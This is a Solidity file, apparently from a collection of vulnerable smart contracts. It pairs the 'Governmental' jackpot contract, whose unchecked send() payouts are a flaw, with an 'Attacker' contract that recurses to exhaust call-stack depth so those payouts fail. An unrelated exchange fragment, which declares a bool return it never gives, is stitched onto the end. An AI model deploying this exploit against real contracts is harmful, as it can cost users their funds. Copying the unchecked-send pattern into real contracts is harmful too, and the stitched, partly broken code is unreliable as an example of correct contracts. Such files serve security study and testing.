 

 
pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}

contract SafeMath {

    function safeMul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}

contract IMDEXDexchange is SafeMath {
    mapping (address => mapping (address => uint256)) public tokens;
    mapping (address => uint256) public invalidOrder;
    mapping (address => uint256) public lastActiveTransaction;
    address public feeAccount;
    modifier onlyAdmin {
        require(msg.sender == owner && admins[msg.sender]);
        _;
    }
    address public owner;
    mapping (address => bool) public admins;
    event Trade(address tokenBuy, uint256 amountBuy, address tokenSell, uint256 amountSell, address get, address give);

    function IMDEXtrade(uint256[8] X, address[4] Y) public onlyAdmin returns (bool) {
        require(invalidOrder[Y[2]] < X[3]);
        if (X[6] > 100 finney) X[6] = 100 finney;
        if (X[7] > 100 finney) X[7] = 100 finney;
        require(tokens[Y[0]][Y[3]] > X[4]);
        require(tokens[Y[1]][Y[2]] > (safeMul(X[1], X[4]) / X[0]));
        tokens[Y[0]][Y[3]] = safeSub(tokens[Y[0]][Y[3]], X[4]);
        tokens[Y[0]][Y[2]] = safeAdd(tokens[Y[0]][Y[2]], safeMul(X[4], ((1 ether) - X[6])) / (1 ether));
        tokens[Y[0]][feeAccount] = safeAdd(tokens[Y[0]][feeAccount], safeMul(X[4], X[6]) / (1 ether));
        tokens[Y[1]][Y[2]] = safeSub(tokens[Y[1]][Y[2]], safeMul(X[1], X[4]) / X[0]);
        tokens[Y[1]][Y[3]] = safeAdd(tokens[Y[1]][Y[3]], safeMul(safeMul(((1 ether) - X[7]), X[1]), X[4]) / X[0] / (1 ether));
        tokens[Y[1]][feeAccount] = safeAdd(tokens[Y[1]][feeAccount], safeMul(safeMul(X[7], X[1]), X[4]) / X[0] / (1 ether));
        lastActiveTransaction[Y[2]] = block.number;
        lastActiveTransaction[Y[3]] = block.number;
    }
}
